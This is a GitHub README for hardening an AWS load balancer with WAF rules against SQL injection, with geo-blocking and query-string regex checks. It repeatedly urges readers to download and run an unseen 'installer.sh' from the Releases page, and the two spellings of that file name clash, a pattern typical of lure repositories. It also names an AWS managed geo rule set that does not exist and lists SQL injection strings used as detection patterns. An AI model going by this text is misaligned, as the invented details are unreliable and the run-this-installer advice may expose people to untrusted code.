[![Releases badge](https://img.shields.io/badge/Releases-Downloads-blue?style=for-the-badge)](https://github.com/xMhaty/AWS_WAF_ALB_Security/releases)

This repository provides a practical approach to protect an Application Load Balancer (ALB) with AWS WAF. It focuses on preventing SQL injection (SQLi), enforcing geolocation rules, and inspecting query strings to block suspicious patterns. The setup blends managed AWS rules with custom filtering to give you a robust, maintainable security surface for web applications running behind ALB.

- Topics: alb, aws, aws-waf, cloud, ec2, geo-location, igw, query-string, security, sql-injection, waf
- Primary goal: Enable a secure default for ALB fronting your apps by adding WAF protections that target common attack vectors without sacrificing performance or reliability.
- Intended audience: DevOps engineers, security engineers, cloud architects, developers who deploy web apps on AWS and want to harden entry points with a repeatable, auditable pattern.

At a glance, this project combines infrastructure as code with a guided workflow to set up ALB + WAF, apply AWS managed rules for SQLi, layer in geo-blocking, and implement query-string scrutiny. The releases page is the primary place to grab runnable assets that automate setup. See the Releases page for downloadable installers and tailored templates.

Why this solution? What it solves
- SQL injection prevention at the edge: AWS WAFâ€™s SQLi detection capabilities catch malicious payloads before they reach your application servers.
- Geolocation access control: You can block or allow traffic based on geographic origin to reduce exposure from regions not required for business.
- Query string hygiene: Inspecting the query string helps catch payloads where attackers try to jam risky parameters into the URL.
- Centralized control: All protection sits at the ALB edge, simplifying audits and reducing the blast radius if an application has multiple microservices behind a single load balancer.
- Reproducible security posture: Infrastructure as code (IaC) ensures you can recreate the same security posture in multiple environments (dev, test, prod).

Architecture and design decisions
- Layered defense: The solution applies AWS managed rules for SQLi as the baseline, then layers on geo-location rules and custom query-string checks to address gaps.
- Regional Web ACL for ALB: The Web ACL scope is regional, binding to the ALB that terminates in a specific region. This keeps the WAF logic close to the ingress point and allows efficient rule evaluation.
- Separation of concerns: WAF rules are clearly grouped into SQLi, geo, and query-string categories. This makes it easy to tune each area independently.
- Observability by design: WAF logs, CloudWatch metrics, and S3 storage of logs enable daily reports, anomaly detection, and post-incident analysis.
- Safe defaults with opt-in customization: The default configuration blocks known bad patterns while allowing legitimate traffic by default. Administrators can refine the rules to fit business needs.

Prerequisites
- AWS account with permissions to create or modify ALB, WAFv2 Web ACLs, and IAM roles for logging and monitoring.
- An existing Application Load Balancer (ALB) serving traffic to your web applications.
- AWS CLI installed or access to the AWS Management Console for manual steps.
- IaC tooling if you plan to reproduce the setup (Terraform, CloudFormation, or CDK). This repo includes templates to help you.
- Optional: S3 bucket for WAF logs and CloudWatch for metrics if you want enhanced observability.
- A supported region where ALB and WAF services are available.

How this project organizes its code
- IaC templates: Terraform and CloudFormation templates to create ALB, WAFv2 Web ACLs, and the required IAM roles.
- Configuration files: Reusable snippets for the WAF rulesets (SQLi, GeoMatch, QueryString).
- Documentation: Detailed walkthroughs on deployment, testing, and maintenance.
- Assets: Release assets available on the Releases page. From the Releases page, you can download the installer file named aws-waf-alb-security-installer.sh and run it to bootstrap a starter setup.
- Scripts: Helper scripts to validate the deployment, gather logs, and perform quick health checks.
- Tests and examples: Sample payloads and test cases to verify that protections are active and performing as expected.

Quick start: deploy via code templates
- The recommended workflow is to deploy with IaC so you can version-control changes and apply updates in a predictable manner.
- Pick Terraform or CloudFormation templates from this repository. They are designed to be extensible and safe to modify for your environment.
- The installer in the release assets can set up a baseline environment, then you tailor it to your ALB details.

A minimal Terraform-based outline (conceptual)
- Create a regional Web ACL with:
  - AWSManagedRulesSQLiRuleSet
  - GeoMatchRule with a default allow list and a deny list for restricted regions
  - A custom QueryStringRegexRule for common SQLi patterns in query strings
- Associate the Web ACL with your ALB
- Enable WAF logging to S3 and CloudWatch metrics

A minimal CloudFormation-based outline (conceptual)
- Define an AWS::WAFv2::WebACL:
  - Rules: SQLi rule set, geo rule, and a custom regex-based rule on the query string
  - Default action: Allow
- Define an AWS::WAFv2::WebACLAssociation to bind the Web ACL to the ALB
- Optional: configure logging via AWS::S3::Bucket and AWS::KMS for encryption

Quick start: the installer and downloads
- The primary download location for ready-to-run assets is the Releases page: https://github.com/xMhaty/AWS_WAF_ALB_Security/releases
- From that page, download the file aws-waf-alb-security-installer.sh
- Run the installer to bootstrap a starter setup:
  - Make the file executable: chmod +x aws-waf-alb-security-installer.sh
  - Execute the installer: ./aws-waf-alb_security-installer.sh
- The installer will guide you through:
  - Selecting the target AWS region
  - Providing your ALB ARN and the desired Web ACL name
  - Choosing default action policies (block vs. allow) for questionable traffic
  - Enabling optional logging to S3 and CloudWatch
- After the installer completes, you should have a functional ALB + WAF configuration in place and ready for testing.

Step-by-step deployment guide
1) Plan your security posture
- Decide which regions should be blocked or allowed in geolocation terms. Some deployments only need US-based traffic, while others must be globally accessible. Use GeoMatch rules to enforce this policy.
- Determine the critical path for traffic. Typically, all external traffic to the application passes through the ALB; thus, this is the right choke point to add WAF protections.
- Identify the SQLi payload patterns you want to catch with the SQLi rule set and any exceptions for legitimate payloads (e.g., specific query parameters that legitimately contain SQL-like syntax).

2) Prepare the environment
- Ensure that the ALB exists and is configured to forward traffic to your target groups (EC2 instances, ECS services, or other targets).
- Create an S3 bucket for WAF logs if you intend to store logs for auditing and monitoring.
- Set up CloudWatch log groups if you want to ship WAF metrics to CloudWatch.

3) Deploy the Web ACL
- Use Terraform or CloudFormation templates provided by this repository to create a regional Web ACL.
- Include the SQLi rule set, GeoMatch rule, and a custom QueryString rule.
- Options:
  - AWSManagedRulesSQLiRuleSet: This rule group guards against known SQL injection patterns.
  - AWSManagedRulesGeoMatchRuleSet: Provides a baseline for geolocation filtering with pre-defined country codes.
  - Custom QueryString Regex Rule: Inspects the query string for common attacker patterns (e.g., suspicious tokens, patterns like "' OR 1=1 --", etc.).
- Attach the Web ACL to your ALB via a WebACLAssociation.

4) Validate the configuration
- Verify that the Web ACL is attached to the ALB and that the ALB listener rules propagate the new security configuration.
- Check CloudWatch metrics to confirm that the new rules are firing as expected.
- Run a set of safe test cases that simulate common SQLi payloads and verify that they are blocked.

5) Enforce monitoring and logging
- Enable WAF logs to an S3 bucket for long-term storage and for post-incident analysis.
- Create CloudWatch dashboards to visualize the number of requests, blocked attempts, and rule hits.
- Configure alerts for spikes in blocked requests or unusual patterns that might indicate an attack.

6) Tune and maintain
- Regularly review WAF logs to identify false positives and adjust rules accordingly.
- Update AWS managed rule sets to the latest versions as AWS releases improvements and new protections.
- Consider regional policy changes as business operations grow or shift.

WAF rules explained
- AWSManagedRulesSQLiRuleSet
  - Purpose: Block known SQL injection patterns and techniques used by attackers.
  - Behavior: Analyzes headers, body, and query strings for suspicious SQL payloads.
  - Considerations: While strong, some apps may generate SQL-like strings legitimately; plan to create exceptions where necessary.
- GeoMatchRuleSet
  - Purpose: Restrict access from specific geographic regions.
  - Behavior: Evaluates the source IP's geographic origin and blocks or allows accordingly.
  - Considerations: Over-blocking can disrupt legitimate users; maintain an allowlist if necessary or implement a dynamic exception mechanism.
- QueryStringRegexRule (custom)
  - Purpose: Detect risky patterns embedded in the query string.
  - Behavior: Uses a regular expression set to identify common SQLi attempts across query parameters.
  - Considerations: Regex-based checks can be resource-intensive; keep patterns efficient and review them periodically.

Custom rules for query strings
- Design approach
  - Create a regex pattern set that captures risky substrings and operators typically used in SQLi tests, such as single quotes, SQL comments, and concatenation patterns.
  - Bind a regex pattern set to a rule that inspects the QueryString field of HTTP requests.
  - Apply a blocking action when a match occurs, with an option to log and monitor for false positives.
- Practical examples
  - Example patterns might include:
    - "' OR 1=1"
    - "\" OR [] = []"
    - "; DROP TABLE"
    - "UNION SELECT"
  - Safeguards
    - Ensure legitimate requests that legitimately contain query-like strings (for example, certain search features) are not blocked. Use an exception list or adjust the rule to exclude known harmless parameters.
- Performance considerations
  - Regex checks can introduce processing overhead. Limit the scope to the most dangerous patterns and optimize the patterns for speed.
  - Use AWS managed rules as the baseline for performance and security, then layer on targeted regex checks for critical parameters.

Geo location blocking explained
- Why geolocation filtering matters
  - Reduces the attack surface by excluding traffic from regions with low or no business relevance.
  - Helps reduce incidental exposure to automated bots and credential-stuffing attempts that originate from specific geographies.
- How to implement safely
  - Start with a conservative approach, blocking known risky regions, and gradually expand to a more permissive policy as you observe legitimate traffic patterns.
  - If your app has users or services in multiple countries, consider allowing multiple geographies or implementing a login-based geolocation policy that blocks unauthenticated requests but allows authenticated user sessions.

ALB and WAF integration details
- Binding Web ACL to ALB
  - After creating the Web ACL, bind it to the ALB using a WebACLAssociation. The association ensures all traffic through the ALB passes through the WAF evaluation pipeline.
  - If you have multiple ALBs, you can create multiple associations or share a single Web ACL across ALBs in the same region if policy alignment is desired.
- Conflict resolution
  - If multiple rules match, the highest priority rule applies. Priorities are configurable; place the most important protections earlier in the list for faster evaluation.
  - Ensure default action is set to allow unless you require a hard-stop policy for all unrecognized traffic.

Testing and validation
- Local testing (safe)
  - Use known safe payloads to confirm that legitimate traffic passes through the ALB.
  - Craft test queries that are near the boundary of false positives to identify tuning opportunities.
- Negative testing (security testing)
  - Use a controlled environment or staging environment to simulate SQLi patterns on test endpoints.
  - Confirm that SQLi payloads are blocked, and that legitimate traffic remains accessible.
- End-to-end testing
  - Validate that requests go through the ALB, pass WAF, reach the target, and that responses return correctly to the client.
  - Use monitoring dashboards to verify rule hits and blocked attempts.
- Logging and forensics
  - Confirm that WAF logs contain payload samples, rule names, and decision results (BLOCK or ALLOW).
  - Ensure log storage complies with your data retention policy and privacy requirements.

Observability and logging
- WAF logs
  - Enable WAF logging and store logs in S3 or stream to CloudWatch Logs for real-time monitoring.
  - Logs include the HTTP method, URI, headers, and the matched rule, which helps with incident response and trend analysis.
- CloudWatch metrics
  - Track metrics such as AllowedRequests, BlockedRequests, and RuleMatched counts to quantify protection effectiveness.
  - Create dashboards to visualize daily trends, peak traffic periods, and potential anomalies.
- Alerting
  - Set alerts on spikes in BlockedRequests or unusual patterns in GeoMatchRule matches.
  - Consider alerting for changes in the number of blocked requests that exceed a baseline threshold.

Security and compliance considerations
- Data minimization
  - Configure WAF to log only the necessary fields to reduce storage costs and protect user privacy where feasible.
- Access control
  - Limit who can modify WAF configurations and ALB routes. Use IAM roles with least privilege and enable MFA for critical accounts.
- Change management
  - Use versioned IaC templates and keep a change log for WAF rule updates, ALB changes, and logging configurations.
- Compliance alignment
  - Align settings with your organizationâ€™s security policies, including data handling, geographic restrictions, and incident response processes.

Performance, cost, and scaling tips
- Performance
  - AWS WAF operates at the edge and is designed to be fast, but complex rules can incur latency. Keep the most critical rules early in the evaluation order.
  - Use AWS managed rule sets for broad protection and rely on custom rules sparingly for high-signal cases.
- Cost
  - WAF pricing is based on web ACLs and rules that you evaluate. Keep track of rule counts and log volumes; optimize by removing unused rules.
- Scaling
  - ALB and WAF scale automatically with traffic. Ensure that any additional resources (like WAF logs) are stored in scalable S3 buckets and that you have proper lifecycle policies.

Operational maintenance
- Regular audits
  - Schedule periodic audits of rule effectiveness and update requirements as the application evolves.
- Rule tuning
  - Continuously monitor for false positives and adjust thresholds, patterns, and exceptions as needed.
- Dependency updates
  - Keep AWS managed rule sets up to date and review AWS announcements for new protections or deprecations.

Troubleshooting
- Common issues
  - Blocked legitimate traffic: Review the QueryStringRegexRule and GeoMatchRule configurations to identify overly aggressive patterns.
  - No traffic reaching backend: Ensure the ALB listener and target group configuration align with the Web ACL association.
  - Logs not appearing: Check S3 bucket permissions, CloudWatch log group configuration, and ensure logging is enabled in the WAF Web ACL.
- Debug steps
  - Temporarily set the default action to Allow while you diagnose rule behavior. Re-enable blocking once tests pass.
  - Use sample payloads that trigger specific rules to confirm matches and rule order.

Appendix: common pitfalls and FAQs
- Q: What if my application uses WebSocket traffic?
  - A: WAF primarily targets HTTP/HTTPS traffic. If you rely on WebSocket, ensure the ALB listener rules and target groups can handle the protocol. WAF checks may differ for non-HTTP payloads, so test thoroughly.
- Q: Can I use this in a multi-account setup?
  - A: Yes. You can deploy a shared WAF or per-account Web ACL depending on your governance model. Use cross-account IAM roles to manage resources centrally if needed.
- Q: How often should I update managed rule sets?
  - A: AWS releases updates regularly. Schedule quarterly reviews or align with your security policy to apply updates after testing in a staging environment.
- Q: How do I handle false positives?
  - A: Start with the most conservative rules, observe the traffic, and create exceptions for legitimate parameters. Maintain a log of adjusted rules for auditability.
- Q: How can I automate remediation if WAF blocks become too aggressive?
  - A: Build automated tests and feedback loops. If a legitimate user is blocked, implement a temporary allow-list mechanism for certain IPs or regions, while you investigate root causes.
